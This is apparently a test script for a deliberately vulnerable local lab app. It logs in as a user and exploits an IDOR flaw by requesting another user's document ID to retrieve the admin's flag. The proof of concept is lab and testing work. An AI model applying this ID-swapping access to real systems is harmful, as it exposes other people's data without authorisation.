#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")
$DC down 2>/dev/null || true
$DC up --build -d
trap "$DC down" EXIT
sleep 3

# 1. Login as alice
TOKEN=$(curl -sf -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
[ -n "$TOKEN" ] && echo "[+] PASS: alice logged in" || { echo "[-] FAIL: no token"; exit 1; }

# 2. Alice's own document: no flag
OUT=$(curl -sf -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/documents/1)
echo "$OUT" | grep -qE 'POC\{' && { echo "[-] FAIL: flag in alice's own doc"; exit 1; } || echo "[+] PASS: alice's document contains no flag"

# 3. Admin's document via IDOR: flag
OUT2=$(curl -sf -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/documents/2)
echo "$OUT2" | grep -qE 'POC\{[0-9a-f]{32}\}' && echo "[+] PASS: IDOR, alice read admin's document and got the flag" || { echo "[-] FAIL: $OUT2"; exit 1; }

# 4. No token: 401
STATUS=$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8080/api/documents/1)
[ "$STATUS" = "401" ] && echo "[+] PASS: unauthenticated request blocked" || { echo "[-] FAIL: expected 401 got $STATUS"; exit 1; }

echo "[+] All tests passed"
